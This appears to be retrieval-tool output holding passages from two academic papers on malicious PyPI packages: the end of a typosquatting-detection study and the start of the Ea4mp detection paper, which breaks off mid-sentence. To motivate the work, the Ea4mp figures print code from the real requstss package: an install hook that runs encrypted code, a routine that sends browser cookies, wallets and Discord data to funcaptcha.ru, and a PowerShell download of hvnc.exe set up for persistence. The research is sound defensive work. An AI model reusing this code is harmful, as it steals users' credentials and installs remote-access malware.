provide codepage\\nURLs or use URLs on PyPI as their homepages.\\nWe noticed that 613 packages use https://github.com/pypa/\\nsampleproject as their homepage URLs. This case might hap-\\npen because package developers had used a template to create\\nPyPI packages, but did not update their homepage URLs to the\\ntemplate. Moreover, 12 266 other packages are sharing several\\nhomepage URLs. This might happen for both malicious and\\nbenign reasons. The typosquatting packagejeLlyfishused\\nthe homepage URL of the legitimate packagejellyfish\\nunchanged so it may look legitimate to End Users.\\nFigure 3 shows the distribution of the Levenshtein distances\\nbetween all packages names in PyPI. The distance distribution\\nhas a shape of a normal distribution with 4 225 244 (0.02%)\\npairs of packages that have distances between one and two.\\n54.8% of the pairs have a distance between 9 and 16. The\\nbiggest Levenstein distance between package names is 80.19\\nHence, the identiﬁed threshold of the Levenshtein distance\\n(d=2) could be seen as a good trade-off, since it allows us to\\nidentify the majority of known attacks and does not generate\\na signiﬁcant number of alerts (d=4 increases the 51 times\\namount of alerts from 4.2 million to 215 million).\\nKnown attacks. We observe that the attacks in Table I\\ntargeted popular packages: seven Github repositories (25%)\\nof the attacked packages have more than 2356 stars, 14 repos-\\nitories (50%) have more than 972 stars, and 21 repositories\\n(75%) of the packages have more than 84 stars. Fifteen out of\\nthe 28 squatting attacks are identiﬁed by setting the distance\\n18We found seven packages whose URLs are broken and corrected them.\\n192to3 and aaaaaaaaaaaaaaaaaaa-aaaaaaaaa-aaaaaaasa-aa\\naaaaasa-aaaaasaa-aaaaaaasa-bbbbbbbbbbb\\n512\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. Fig. 3: Levenshtein distance distribution of package names.\\nFig. 4: #Packages whose name differ from standard modules.\\nthreshold of one. Increasing the threshold to two allows us to\\ncapture six additional attacks (21 out of 28).\\nLooking at other packages in PyPI.\\nModules of Python standard library: We found 62 pack-\\nages in PyPI that have the same names as modules of the\\nPython standard library. We further checked whether we found\\nthe packages published by Stagg [3]: while Stagg published\\n‘empty’ packages that were removed from PyPI, we identiﬁed\\nseveral packages with non-empty sources. Particularly, 16 out\\nof 62 packages do not have any releases, and 12 packages\\nhave only one release. Hence, we conﬁrm that these packages\\nare not the ones published by [3] and conﬁrm our manually\\nanalysis.\\nFigure 4 shows the distance distribution between Python\\nstandard library module names and other packages’ names.\\nThere are 296 PyPI packages whose names have the distance\\nless than or equal to two from Python standard library module\\nnames, and therefore, suspicious.\\nPyPI packages with known sources:From those packages\\nthat use the Github to host their source code, 79 933 packages\\n(36.9%) have the same name for both Github repository\\nand package name in PyPI (i.e., safe packages). Names of\\n61 522 packages differ from the names of their source code\\nFig. 5: #Packages whose names differ from repository names.\\nrepositories, and therefore, these packages require additional\\nanalysis. In Figure 5, we identiﬁed approximately 65 000 PyPI\\npackages have the names similar to the packages with known\\nsources (they have a distance less than or equal two).\\nInteresting naming patterns. We noticed some patterns\\nbetween the package names and repository names:\\n• 16 070 (7.4%) package names include names of their\\ncode repositories or vice versa (e.g., the package\\n0-core-clienthas its repository name0-core),\\n• several common preﬁxes and sufﬁxes are added or re-\\nmoved from the repository names to create PyPI package\\nnames. Several common preﬁxes are ‘python-’ (2287),\\n‘-python’ (1343), ‘.git’ (1324),\\nUnderstanding these naming patterns might potentially sup-\\nport predicting future combosquatting attacks of legitimate\\npackages as adding/deleting a sufﬁx or preﬁx is one of the\\ncombosquatting strategies (See Section III).\\nVI. T HREA TS TOVALIDITY\\nMissing potential typosquatting packages.Our approach\\ncan be applied for detecting typosquatting candidates of pack-\\nages whose names are longer than 2 (the selected threshold).\\nHowever, as shown in Table II, 75% of packages in PyPI have\\nmore than seven characters in their names. Hence, our pro-\\nposed approach relies on the Levenshtein distance applicable\\nto most of the PyPI ecosystem packages. To capture packages\\nwith short names, we plan to use common name patterns (e.g.,\\nrepeated or swapped characters)([5],[8]).\\nFalse positivesThe proposed approach has generated false-\\npositive ﬁndings. For example, a package name might differ\\nfrom its source code repository name for a good reason, e.g.,\\nthe developers could not register the repository name because\\nthe name has been reserved. We manually veriﬁed 62 packages\\n(the ones look the same to standard libraries) and identiﬁed\\nthe following reasons behind existing of these packages in\\nPyPI: backport to old Python versions (17), empty packages\\n(17), toy packages (2), legitimate deprecated packages with\\ndifferent functionality (26).\\nThe manual analysis allowed us to identify the following\\nideas to reduce the number of false positives by analyzing:\\n513\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. package info (e.g., author reputation, package popularity) and\\ncode features (e.g., suspicious API calls).\\nWe use source code repository as a trusted source.\\nThe legitimacy of a package depends on the equality of\\npackage and repository name. However, a repository name\\nis not necessarily unique across Github (e.g., stub42/pytz and\\nnewvem/pytz). An organization and a repository name identify\\na project in Github. Hence, attackers may create a repository\\nwith the same name but different organization identiﬁers as an\\nexisting repository in Github (or even a new repository) and\\npublish a corresponding package in PyPI. Our approach is not\\ncapable of identifying such an attack. However, this attack\\nrequires additional effort to trick the users into downloading\\npackages that come from an unknown source. To overcome\\nthis limitation, we plan to extend the proposed approach to\\nconsidering other reputation metrics (e.g., number of stars).\\nOn the other hand, one Github repository might be used to\\nstore code of several different PyPI packages. For example,\\na Github repository https://github.com/Azure/azure-sdk-for-\\npython organization corresponds to 140 packages in PyPI (e.g.,\\nazure, azure-ai-nspkg). In such a case, our approach\\nwould generate a false alert.\\nAlso, the referred repository does not need to contain code\\nthat bears any relation to the package. We plan to employ\\na code analysis to identify such a discrepancy (whether a\\nparticular code fragment in a package originates from its\\nsource code repository). This might be a good signal for\\ndetection of injected code added by attackers or backporting\\nchanges added by developers directly to the packages.\\nSome known attacks are not caught. Although the\\nproposed approach allows us to catch most of the known\\ntyposquatting attacks, some attacks in Table I still remained\\nunidentiﬁed. Additional ways of checking modiﬁcations of\\npackage names might allow the detection of such attacks.\\nFor example, attacks #20, #22, #23, #24, #25, #27 are based\\non the permutation of the legitimate package names, while\\ntyposquatting package names in attacks #4, #5, #12, #8\\nwere created as a result of deletions of a part of legitimate\\npackage names. However, including such checks to enlarge the\\nsearch space for the possible typosquatting candidates might\\nsigniﬁcantly increase the number of false positive alerts, and\\ntherefore, could not be used alone. Hence, we are planning to\\ninvestigate the common patterns of packaging names in future\\nwork and embed them into our approach.\\nVII. R ELA TED WORK\\nDuan et al. [9] extract various features of a package to\\nidentify its maliciousness. They rely on the predeﬁned list of\\npopular packages to ﬁnd suspicious packages. We propose a\\nmethod to automatically ﬁnd legitimate packages that can be\\nused for ﬁnding potential typosquatting attacks.\\nTschacher [1] presented a comprehensive analysis of ty-\\nposquatting attacks, including the systematic generation of\\ntyposquatting package names, the publication of forks of the\\noriginal packages in several open-source ecosystems. By doing\\nthis, they can measure the severity of such an attack by\\ncounting the number of successful installations. Our study\\ncomplements this work by providing an approach for obtaining\\na list of legitimate package names that can be used for\\nautomatic identiﬁcation of typosquatting packages in PyPI.\\nTaylor et al. [8] proposed an approach to identify typosquat-\\nting candidates based on package name patterns, like repeated,\\nomitted, or swapped characters, common typos, swapped\\nwords, and Python version numbers. While the authors con-\\nsidered the most downloaded packages, we have analyzed all\\nthe packages with source code repository links.\\nVIII. C ONCLUSION AND FUTURE WORK\\nIn this paper, we have studied attackers strategies in crafting\\nmalicious packages and trick Python developers into down-\\nloading malicious packages whose names are similar to the\\nlegitimate packages, i.e., the combosquatting and typosquat-\\nting attacks in the Python Package Index ecosystem. We have\\nalso proposed an automatic approach for detecting packages\\naffected by the typosquatting attack. The empirical evaluation\\nof the proposed approach on the list of known squatting attacks\\nsuggests that the approach is promising to be used in future\\nresearch for automatic identiﬁcation of malicious packages in\\nPyPI and has the potential for creating an automatic system\\nthat prevents squatting attacks in the PyPI ecosystem.\\nFor the future work, we plan to extend the approach to\\nemploy the code level checks of the identiﬁed packages so\\nthat it will be capable of automatically identifying injected\\nmalicious code snippets into Python packages. Additionally,\\nwe plan to explore the applicability of the approach to other\\nsoftware ecosystems, like NPM or Maven.\\nACKNOWLEDGMENTS\\nThis research has been partly funded by the EU under the\\nH2020 Programs H2020-EU.2.1.1-CyberSec4Europe (Grant\\nNo. 830929), the NeCS: European Network for Cyber Security\\n(Grant No. 675320) and the SP ART A project (Grant No.\\n830892).\\nREFERENCES\\n[1] N. P . Tschacher, “Typosquatting in programming language package man-\\nagers,” Bachelor’s Thesis, Universität Hamburg, Fachbereich Informatik.\\n[2] A. Z. Robert Perica, “Suppy chain malware - detecting malware in pack-\\nage manager repositories,” https://blog.reversinglabs.com/blog/suppy-\\nchain-malware-detecting-malware-in-package-manager-repositories.\\n[3] S. Stagg, “Building a botnet on pypi,” https://hackernoon.com/building-\\na-botnet-on-pypi-be1ad280b8d6, 2017.\\n[4] V . I. Levenshtein, “Binary codes capable of correcting deletions, inser-\\ntions, and reversals,” inSoviet physics doklady, 1966.\\n[5] Y . Hu, H. Wang, R. He, L. Li, G. Tyson, I. Castro, Y . Guo, L. Wu, and\\nG. Xu, “Mobile app squatting,” inProc. of WWW’2020, 2020.\\n[6] P . Kintis, N. Miramirkhani, C. Lever, Y . Chen, R. Romero-Gómez,\\nN. Pitropakis, N. Nikiforakis, and M. Antonakakis, “Hiding in plain sight:\\nA longitudinal study of combosquatting abuse,” inProc. of CCS’17.\\n[7] I. Pashchenko, D. L. Vu, and F. Massacci, “A qualitative study of depen-\\ndency management and its security implications,” inProc. of CCS’20.\\n[8] M. Taylor, R. K. V aidya, D. Davidson, L. De Carli, and V . Rastogi,\\n“Spellbound: Defending against package typosquatting,”arXiv preprint.\\n[9] R. Duan, O. Alrawi, R. P . Kasturi, R. Elder, B. Saltaformaggio, and\\nW . Lee, “Measuring and preventing supply chain attacks on package\\nmanagers,”arXiv preprint.\\n514\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. '} score: 0.09314770204036235\n",
      "{'metadata': {'/Meeting Starting Date': '27 Oct. 2024', '/ModDate': \"D:20241127093145-05'00'\", '/IEEE Article ID': '10764827', '/CreationDate': 'D:20240926225444Z', '/IEEE Issue ID': '10764801', '/Producer': 'OpenPDF 1.0.0-SNAPSHOT; modified using iText® Core 7.2.4 (AGPL version) ©2000-2022 iText Group NV', '/Subject': '2024 39th IEEE/ACM International Conference on Automated Software Engineering (ASE);2024; ; ; ', '/IEEE Publication ID': '10764795', '/Title': '1+1&#x003E;2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection', '/Meeting Ending Date': '1 Nov. 2024'}, 'data': '1+1>2: Integrating Deep Code Behaviors with Metadata Features\\nfor Malicious PyPI Package Detection\\nXiaobing Sun\\nxbsun@yzu.edu.cn\\nYangzhou University\\nYangzhou, China\\nXingan Gao\\nMX120230566@stu.yzu.edu.cn\\nYangzhou University\\nYangzhou, China\\nSicong Cao∗\\nDX120210088@yzu.edu.cn\\nYangzhou University\\nYangzhou, China\\nLili Bo†\\nlilibo@yzu.edu.cn\\nYangzhou University\\nYangzhou, China\\nXiaoxue Wu\\nxiaoxuewu@yzu.edu.cn\\nYangzhou University\\nYangzhou, China\\nKaifeng Huang\\nkaifengh@tongji.edu.cn\\nTongji University\\nShanghai, China\\nABSTRACT\\nPyPI,theofficialpackageregistryforPython,hasseenasurgeinthe\\nnumber of malicious package uploads in recent years. Prior studies\\nhave demonstrated the effectiveness of learning-based solutions\\nin malicious package detection. However,manually-crafted expert\\nrules are expensive and struggle to keep pace with the rapidly\\nevolving malicious behaviors, while deep features automatically\\nextractedfromcodearestillinaccurateincertaincases.Tomitigate\\nthese issues, in this paper, we propose Ea4mp, a novel approach\\nwhich integrates deep code behaviors with metadata features to\\ndetect malicious PyPI packages. Specifically, Ea4mp extracts code\\nbehavior sequences from all script files and fine-tunes a BERT\\nmodel to learn deep semantic features of malicious code. In addi-\\ntion,werealizethevalueofmetadatainformationandconstructan\\nensemble classifier to combine the strengths of deep code behavior\\nfeatures and metadata features for more effective detection. We\\nevaluatedEa4mpagainstthreestate-of-the-artbaselinesonanewly\\nconstructed dataset. The experimental results show that Ea4mp\\nimproves precision by 6.9%-24.6% and recall by 10.5%-18.4%. With\\nEa4mp, we successfully identified 119 previously unknown mali-\\nciouspackagesfromapoolof46,573newly-uploadedpackagesover\\na three-week period, and 82 out of them have been removed by the\\nPyPI official.\\nCCS CONCEPTS\\n• Security and privacy→Malware and its mitigation.\\nKEYWORDS\\nOpen-Source Software, Malicious Packages, PyPI, BERT\\n*Sicong Cao is the corresponding author.\\n†Yunnan Key Laboratory of Software Engineering, Yunnan, China.\\nPermission to make digital or hard copies of all or part of this work for personal or\\nclassroom use is granted without fee provided that copies are not made or distributed\\nforprofitorcommercialadvantageandthatcopiesbearthisnoticeandthefullcitation\\non the first page. Copyrights for components of this work owned by others than the\\nauthor(s) must be honored. Abstracting with credit is permitted. To copy otherwise, or\\nrepublish,topostonserversortoredistributetolists,requirespriorspecificpermission\\nand/or a fee. Request permissions from permissions@acm.org.\\nASE ’24, October 27-November 1, 2024, Sacramento, CA, USA\\n© 2024 Copyright held by the owner/author(s). Publication rights licensed to ACM.\\nACM ISBN 979-8-4007-1248-7/24/10\\nhttps://doi.org/10.1145/3691620.3695493\\nACM Reference Format:\\nXiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng\\nHuang. 2024. 1+1>2: Integrating Deep Code Behaviors with Metadata Fea-\\ntures for Malicious PyPI Package Detection. In39th IEEE/ACM Interna-\\ntional Conference on Automated Software Engineering (ASE ’24), October\\n27-November 1, 2024, Sacramento, CA, USA.ACM, New York, NY, USA,\\n12 pages. https://doi.org/10.1145/3691620.3695493\\n1 INTRODUCTION\\nThe Open-Source Software (OSS) supply chain is fragile due to in-\\nsufficient security safeguards. The recentXZ incident [25] gathered\\nwidespread attention in the open-source and cybersecurity com-\\nmunity, indicating the weakness of existing open-source software\\ninfrastructure.XZ is a widely used open-source data compression\\ntool integrated into Linux systems as part of theliblzma library.\\nThe attacker implants malicious code to corrupt the SSH server\\nprocess and hijack the SSH authentication function. The incident is\\njust the tip of the iceberg of security incidents in the open-source\\nsoftware supply chain in recent years. However, it also serves as a\\nwake-up call to developers that we need to pay close attention to\\nthe current state of security when using open-source software.\\nAs the most popular programming language [41], securing the\\nPython ecosystem is one of the top priorities. Python has become\\nthe go-to choice for many developers due to its simplicity and ease\\noflearning.AstheofficialpackageregistryforPython,PyPI(Python\\nPackage Index) [33] has flourished numerous packages and depen-\\ndencies, which have evolved rapidly. It serves as a major platform\\ntodistributePythonpackages.However,PyPIhasrecentlyreported\\nmultiple instances of supply chain poisoning (i.e., adversaries up-\\nload malicious packages to affect the downstream dependencies),\\nshedding light on the ongoing security challenges confronting the\\nplatform [21]. In response to the situation, the PyPI officials and\\nthe security experts have ramped up their efforts to fortify security\\nmeasures. However, as malicious packages grow in sophistication,\\nexisting measures become cost-ineffective.\\nTo detect malicious PyPI packages, a straightforward way is\\nstaticcodeanalysis,asrecentworks[40,50,14,43,1,24]do.Forex-\\nample,Amalfi[40]extracted11pre-definedfeatures( e.g.,APIcalls\\nand permission) from known malicious packages to train Machine\\nLearning (ML)-based classifiers. However, these manually-crafted\\nexpertrulesareexpensiveandstruggletokeeppacewiththerapidly\\n1159\\n2024 39th IEEE/ACM International Conference on Automated Software Engineering (ASE)\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE ’24, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\nevolving malicious behaviors [21, 38]. What’s worse, the crafty at-\\ntackers may disperse malicious behaviors into different functions\\nor files [21, 50, 38]. As a result, limited feature sets fail to charac-\\nterize comprehensive malicious behaviors (i.e., network, process,o r\\ncode generationAPIs), leading to high false negatives. To overcome\\nthis limitation, Liang et al. [24] propose a new approach. They use\\nword embedding model [2] to learn semantic information from\\ncode and convert code behavior sequences into vectors. However,\\nthis word embedding model is only effective for shorter sequences\\nand cannot handle the longer sequences that represent the entire\\npackage. Moreover, when attackers upload a large number of mali-\\ncious packages to the PyPI, these packages form abnormal clusters.\\nThisrendersclusteringalgorithmsineffectiveatidentifyingoutliers,\\ncausing detection to fail. Zhang et al. [50] leverage the sequential\\ninformationfromtheentirepackagetoidentifymaliciouspackages\\nbyusingBERT[15].Thisapproachcanovercomethelimitationthat\\nclusteringalgorithmsareunabletodetectanomalousclusters.How-\\never, they still extracted the sequential information by manually\\ndefining the feature set.\\nIn contrast to purely static solutions, Maloss [17] incorporated\\nadditional metadata and dynamic analysis modules to detect mali-\\ncious PyPI, NPM, and RubyGems packages. Since dynamic analysis\\nis computationally intensive and time-consuming [7], making it\\nless suitable for daily scanning of large numbers of PyPI packages,\\nwe do not delve too deeply into dynamic analysis in this work.\\nHowever,theirfocusonmetadatainformationcaughtourattention.\\nThey noticed that information such as package names, versions,\\netc., would reveal the attacker’s attempts (to induce the victim to\\ndownload these malicious packages), so they used this metadata\\ninformation as part of their manually extracted feature set. Exper-\\niments proved that the metadata information effectively helped\\nthem detect some malicious packages that could not be detected\\nby code information alone. However, their analysis of metadata re-\\nmainslimitedtoafewsimplefeatureswithoutinvestigatingaspects\\nlike package descriptions and so on. By comparing thePKG-INFO\\n(which contains all metadata information about a Python pack-\\nage) of benign and malicious packages, we found that compared to\\nresponsibledevelopers,maliciousattackerstendtooverlookorran-\\ndomly input meaningless characters into fields like the description\\nandsummary.Inotherwords,wecaneasilyutilizethisinformation\\nto detect malicious packages.\\nTo address the above limitations, we propose a novel approach\\nEa4mp, which integrates deep code behavior features with meta-\\ndata features to detect malicious packages on PyPI. Specifically,\\nto avoid the intense labour of human experts on feature engineer-\\ning, we analyze all Python script files and automatically extract\\ndeep features from ordered code behavior sequences of malicious\\npackages via the BERT model. In addition, we realize the value of\\nmetadatainformationandconstructanensembleclassifierbasedon\\nAdaboost to combine the strengths of deep code behavior features\\nand metadata features for more effective detection.\\nTo verify the effectiveness of our proposed Ea4mp, we collected\\n3,404 malicious packages and 10,000 benign packages as the eval-\\nuation dataset and compared Ea4mp with three state-of-the-art\\n(VirusTotal, OSSGadget, and Bandit4Mal) baselines. The exper-\\nimental results show that Ea4mp improves precision by 6.9%-24.6%\\nand recall by 10.5%-18.4%. We also monitored 46,573 software pack-\\nages uploaded on PyPI between March 28 and April 18, 2024, 119\\nof which were malicious packages found by Ea4mp. We reported\\nthesepackagestoPyPIofficials,and82ofthemhavebeenremoved.\\nThe contributions of our paper are as follows:\\n• We propose Ea4mp, a novel approach which combines the\\nstrengths of deep code behavior features and metadata features\\nfor malicious PyPI package detection.\\n• We thoroughly analyzed 3,404 known malicious packages and\\nconstructed a comprehensive feature set of metadata.\\n• Ea4mp has uncovered 119 previously unknown malicious pack-\\nages.WereportedthesepackagestoPyPIofficials,and82ofthem\\nhave been removed. Our dataset and source code are available at\\nhttps://github.com/ea4mp/ea4mp\\nPaper Organization.The remainder of this paper is organized as\\nfollows. Section 2 presents the background knowledge related to\\nour problem. Section 3 introduces the details about our proposed\\nEa4mp. Section 4 describes the experimental setup and reports the\\nresults. Section 5 presents an additional discussion of our approach.\\nSection 6 reviews the related work. Section 7 concludes this paper\\nand outlines our future research agenda.\\n2 BACKGROUND\\nInthissection,wedescribehowthesethreetypesofattacksaretrig-\\ngered and then introduce the principles and limitations of existing\\ndetection approaches and the motivation of our work.\\n2.1 Open Source Supply Chain\\nAs the software industry evolves, the conventional solitary devel-\\nopment model is progressively inadequate in meeting the escalat-\\ning complexity and the demands for swift iteration. To expedite\\ndevelopmentprocesses,curtailredundantlabour,manageR&D(Re-\\nsearch and Development) expenses, and stimulate technological\\ninnovation, software developers are transitioning towards a more\\nefficacious mode of collaboration-open-source cooperation. This\\nparadigm permits developers globally to exchange code, mutually\\nlearn, and collectively resolve issues, thereby significantly enhanc-\\ning the efficiency and calibre of software development. Within this\\ntrajectory,theOpen-SourceSoftware(OSS)supplychainisanindis-\\npensable component of contemporary software development [22].\\nThe OSS supply chain embodies a linear, deeply collaborative\\nsoftware production framework encompassing the entire gamut\\nfrom the inception, scrutiny, amalgamation, and testing to the dis-\\nseminationofsourcecode.Thissupplychainnotonlyencompasses\\nthe code itself but also encompasses an array of supportive infras-\\ntructure, including dependency management, continuous ensem-\\nble/continuous deployment (CI/CD) tools, code hosting platforms,\\nand automated testing frameworks\\nBased on the research reported by [35, 36, 37], the Open-source\\nSoftware supply chain is witnessing robust development. Over the\\npast three years, third-party dependency hosting repositories for\\nmajor programming languages have experienced rapid expansion.\\nFor instance, NPM [29] (Node Package Manager) has emerged as a\\ncornerstone for JavaScript developers, offering a vast repository of\\nover 2.3 million packages. Maven Central Repository [26] stands\\n1160\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. 1+1>2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection ASE ’24, October 27-November 1, 2024, Sacramento, CA, USA\\nRegistry\\nMirrors\\nOfficial \\nRegistry\\u07bdUpload\\n\\u07bfDownload\\nAttacker\\nDeveloper\\nManager\\nVe t ߀\\n߁Request\\n߂Install Users\\n߄Import\\nLocal Registry\\n\\u07beUpload\\n߃Download\\nFigure 1: Threat model.\\nas the central hub for Java dependencies, facilitating seamless en-\\nsemble and management of libraries for Java projects. NuGet [30]\\nserves as the primary repository for .NET developers, providing a\\nrich ecosystem of packages for .NET applications and frameworks.\\nThe growth rates of these three major hosting platforms over the\\npastthreeyearshavereached98.3%,70.4%,and146.6%,respectively.\\n2.2 Threat Model\\nDifferent from vulnerabilities which are caused by poor security\\npractices [4], a software package is considered malicious if it is\\ndeveloped and distributed by attackers for malicious ends. They\\ngenerally contain malicious code deliberately inserted to perform\\nattacks, including infecting the target network, stealing and exfil-\\ntrating sensitive information such as passwords and credit card\\ninformation, and engaging in additional malicious activity done\\nby downloaded malware components. From the perspective of the\\ntiming of attacks on end-users by malicious packages, they can be\\ncategorizedintothreetypes:duringinstallation,duringimport,and\\nduring runtime. The structure of malicious packages that attack\\nat different stages varies greatly. For example, malicious packages\\nattackedatinstallationtimeoftenwritemaliciouscodedirectlyinto\\nthe setup.py script, while runtime attacks and import-time attacks\\nmay hide malicious code in other script files [21]. Therefore, it is\\nnecessarytoconductacomprehensiveanalysisofthesethreetypes\\nof attacks.\\nFigure 1 shows how malicious packages propagate through the\\nsoftware supply chain and ultimately impact victims. Attackers\\nupload packages (\\x82) containing malicious code to PyPI and use\\nvarious techniques to evade administrators’ vet (\\x85). Once these\\nmalicious packages are uploaded to PyPI, they start to spread due\\nto the synchronization feature of mirror sources, infecting multi-\\nple mirror sources. Developers, as a specific type of user, might\\ninadvertently download these malicious packages (\\x83\\x84 ). When\\nthese packages are incorporated into new development projects,\\nthe spread of the malicious packages further increases. For end\\nusers, upon sending arequest (\\x86), PyPI automatically downloads\\n(\\x88) the target package to the local registry and performs the instal-\\nlation (\\x87). Some malicious scripts execute during the installation\\nprocess.Othersaremoresubtle,causingnoimmediateharmduring\\ninstallation but executing malicious scripts when the package is\\nimported (\\x89). Even more covert packages hide malicious scripts\\nwithin functions, only triggering malicious actions when the user\\nruns the project. We have conducted a detailed analysis of the trig-\\ngering mechanisms for attacks occurring at these three different\\nstages.\\nMalicious behaviors at install time.Install-time attacks [46]\\noccurwhenusersdownloadandinstallmaliciouspackagesthrough\\npackage managers (e.g., pip, npm, gem,etc.). These attacks ex-\\nploit installation scripts that are automatically executed when the\\npackage is installed (e.g., scripts insetup.py or the scripts field in\\npackage.json). These malicious installation scripts may download\\nand execute malicious code from remote servers, modify system\\nconfiguration files, add backdoors, or create new users to gain sys-\\ntem access [8, 48]. They can also collect sensitive user information\\n(such as environment variables and configuration files) and send it\\nto servers controlled by the attacker.\\nMalicious behaviors at import time.Import-time attacks hap-\\npenwhenusersimportamaliciouspackageormoduleintheircode.\\nThese attacks take advantage of the code that is automatically exe-\\ncutedwhenthemoduleisimported.Boththerequiredstatementin\\nJavaScriptandtheimportstatementinPythoncantriggerthistype\\nof attack. When a malicious module is imported, its initialization\\ncode, which may contain malicious instructions, is executed imme-\\ndiately.Maliciouscodecancollectenvironmentinformationduring\\nimport, such as the operating system type and installed software\\nversions, and send this information to the attacker. Additionally,\\nmalicious modules can modify the behavior of other modules or\\nimplant backdoors in the system during import [49, 47].\\nMalicious behaviors at runtime.Runtime attacks occur during\\nthe execution of the program. These attacks utilize the code exe-\\ncuted by the malicious package at runtime to perform malicious\\noperations. Such attacks may not be triggered during installation\\nor import but are activated during specific function calls or events.\\nUnder certain conditions, the malicious code may execute prede-\\nfined malicious actions, such as deleting files, encrypting data, or\\nsending sensitive information. Malicious code can establish persis-\\ntencemechanismsatruntime,allowingittocontinuerunningeven\\nafter the system reboots while also hiding itself to avoid detection.\\nRuntime malicious code can open backdoors, enabling attackers to\\ncontrol the compromised system remotely.\\n2.3 Motivation\\nInthissection,weanalyzethesourcecodeandmetadataofanewly\\ndetected malicious package,requstss-1.0.0, that was reported\\nby [38]. We have derived two basic facts:\\nFinding 1: Malicious Code Behaviors Span Multiple Script\\nFiles and Exhibit inter-connections.As shown in Figure 2, the\\nattacker executes the malicious payload in thesetup() function\\nby callingGruppeInstall(). In line 4, the attacker first checks the\\nvictim’s runtime environment to evade most Linux-based dynamic\\nanalysis approaches, targeting only Windows users. In Figure 2\\n(b), line 6, the attacker uses theFernet function to encrypt the\\nmaliciouspayload.Afterdecryption,wediscoveredthattheattacker\\ndownloads files from a remote server and overwrites local files.\\nIf we only analyze thesetup.py script, it is actually difficult to\\nverify that this package exhibits malicious behavior. However, by\\n1161\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE ’24, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\nclass GruppeInstall(install):\\ndef run(self):\\nif os.name == \"nt\":\\nfrom fernet import Fernet\\nexec(Fernet(b\\'EBjiyW0IuU6BYDGcO…\\').decrypt(b\\'gA\\nAAAABmA0bbhYYeLFxkKwlWInbw...\\'))\\ninstall.run(self)                \\n…\\nsetup(\\n...\\ncmdclass={\\n\\'install\\': GruppeInstall,\\n},\\npackages=find_packages(),\\nsetup_requires=[\\'fernet\\', \\'requests\\'],\\n...\\nrequests.get(\\'https[:]//funcaptcha.ru/paste2?package=requstss\\').text.replace(\\'<pre>\\',\\'\\').replace(\\'</pre>\\',\\'\\')\\n(c) The Decrypt function in gruppe.py invoked from GruppeInstall in setup.py\\n(a) The setup function in setup.py (b) The GruppeInstall function in setup.py\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n1\\nFigure 2: Malicious code in the setup.py script of the\\nrequstss-1.0.0 package.\\nSTORAGE_PATH = APPDATA + \"\\\\\\\\gruppe_storage\"\\nSTARTUP_PATH = os.path.join(APPDATA, \"Microsoft\", \\n\"Windows\", \"Start Menu\", \"Programs\", \"Startup\")\\n...\\ndef upload_to_server(filepath):\\n...\\nurl = \"https://funcaptcha.ru/delivery\"\\nfiles = {\\'file\\': open(filepath, \\'rb\\')}\\nr = requests.post(url, files=files)\\n...\\nfor browser in CHROMIUM_BROWSERS: ...\\nfor wallet_file in WALLET_PATHS: ...\\nfor discord_path in DISCORD_PATHS: ...\\nfor cookie in COOKIES:\\nzip_to_storage(f \"{browser[\\'name\\']…}\", \\nextension_path, STORAGE_PATH)\\nfor file_to_upload in os.listdir(STORAGE_PATH):\\nupload_to_server(STORAGE_PATH + \"\\\\\\\\\" + \\nfile_to_upload)\\n...\\nURL = \"https://funcaptcha.ru/hvnc.py\"\\nr = requests.get(URL)\\nwith open(os.path.join(STARTUP_PATH, \"hvnc.py\"), \\n\"wb\") as f:\\nf.write(r.content)\\nscript =\\n\"\"\"\\n...\\npowershell -command \"(New-Object \\nSystem.Net.WebClient).DownloadFile(\\'https://funcaptcha.ru/hvnc\\n.exe\\', \\'%temp_file%\\')\"\\nstart \"\" \"%temp_file%\"\\n\"\"\"\\nappdata = os.environ.get(\\'APPDATA\\', \\'\\')\\nif appdata:\\n...\\nscript_path = os.path.join(appdata, \\'Microsoft\\', \\'runpython.py\\')\\nwith open(script_path, \\'w\\') as script_file:\\nscript_file.write(script)\\nsubprocess.Popen([\\'python\\', script_path], \\ncreationflags=subprocess.CREATE_NO_WINDOW)\\n(a) gruppe.py (b) hvnc.py\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n9\\n10\\n11\\n12\\n13\\n14\\n15\\n16\\n17\\n18\\n19\\n20\\n21\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n9\\n10\\n11\\n12\\n13\\n14\\nFigure 3: Malicious code in the gruppe.py and hvnc.py script\\nof therequstss-1.0.0 package.\\nanalyzing other script files within the package, we found more evi-\\ndenceprovingthatthisisamaliciouspackage.AsshowninFigure3\\n(a),lines10-13,theattackerreadsalargeamountofthevictim’spri-\\nvatedata.Atline14,bycallingthe zip_to_storage() function,the\\nattacker packages the victim’s data and uploads it to the attacker’s\\nhost at line 16. Additionally, to continuously obtain the victim’s\\nprivate information, at line 2 of Figure 3 (a), the attacker reads\\nthe victim’s startup directory and, in lines 18-21, writes another\\nmalicious script,hvnc.py, into the startup items. After analyzing\\nthe hvnc.py script, we discovered that the attacker downloads the\\nhvnc.exe program from a remote host to the victim’s machine, en-\\nabling the persistent acquisition of the victim’s private data. It is\\nnot difficult to find that the attackers start to try to disassemble the\\nmalicious behaviors and disperse them into different files. These\\nmalicious behaviors always show inter-connections that cannot 